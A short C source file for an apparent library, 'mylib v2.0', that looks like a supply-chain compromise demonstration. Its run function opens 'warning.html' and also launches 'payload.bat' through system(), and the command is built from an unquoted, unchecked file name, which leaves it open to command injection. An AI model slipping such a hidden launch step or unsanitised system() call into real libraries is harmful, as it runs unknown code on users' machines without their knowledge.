#include <stdio.h>
#include <stdlib.h>
#include "mylib.h"

void open_html(const char *filename) {
#ifdef _WIN32
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "start %s", filename);
    system(cmd);
#elif __APPLE__
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "open %s", filename);
    system(cmd);
#else
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "xdg-open %s", filename);
    system(cmd);
#endif
}

void mylib_run(void) {
//    FILE *f = fopen("warning.html", "w");
//    if (f != NULL) {
//        fprintf(f,
//            "<!DOCTYPE html>\n"
//            "<html>\n"
//            "<head><title>Warning</title></head>\n"
//            "<body style='font-family:sans-serif;'>\n"
//            "<h1>?????? hack ????</h1>\n"
//            "<p>?????????????? Software Supply Chain Failure</p>\n"
//            "</body>\n"
//            "</html>\n"
//        );
//        fclose(f);
//        printf("mylib v2.0: Generated warning.html\n");
//        printf("Open the file in a browser to see the result.\n");
//    } else {
//        printf("mylib v2.0: Failed to create HTML file.\n");
//    }
    
    open_html("warning.html");
    open_html("payload.bat");
}

